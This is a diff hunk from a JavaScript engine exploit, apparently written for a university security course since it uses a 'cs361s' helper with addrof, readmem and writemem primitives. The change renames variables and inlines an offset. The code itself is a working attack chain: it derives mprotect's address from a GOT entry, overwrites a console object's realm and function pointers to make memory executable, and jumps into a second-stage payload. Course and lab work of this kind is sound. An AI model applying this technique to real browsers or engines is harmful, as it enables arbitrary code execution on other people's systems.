@@ -37,13 +37,13 @@ let mprotect_addr = got_entry - 0x31B00; // std offset from malloc to mprotect
  * Find where the second stage payload even is
  * look at text segment 
  */
-let target = cs361s.addrof(second_stage);
-let c_func_offset = 56;
+let second_stage_addr = cs361s.addrof(second_stage);
+
 let old_realm = cs361s.readmem(addressconsole + 48);
-cs361s.writemem(addressconsole + 48, target); // overwrite realm
-cs361s.writemem(addressconsole + c_func_offset, mprotect_addr);
+cs361s.writemem(addressconsole + 48, second_stage_addr); // overwrite realm
+cs361s.writemem(addressconsole + 56, mprotect_addr);
 console.log.apply(2.0237e-320, null); // rwx
 // Execute Payload
 cs361s.writemem(addressconsole + 48, old_realm); // restore realm
-cs361s.writemem(addressconsole + c_func_offset, target + 16); // start of string + 16 HAHAHAHAHHAHAHA
+cs361s.writemem(addressconsole + 56, second_stage_addr + 16); // start of string + 16 HAHAHAHAHHAHAHA
 console.log();
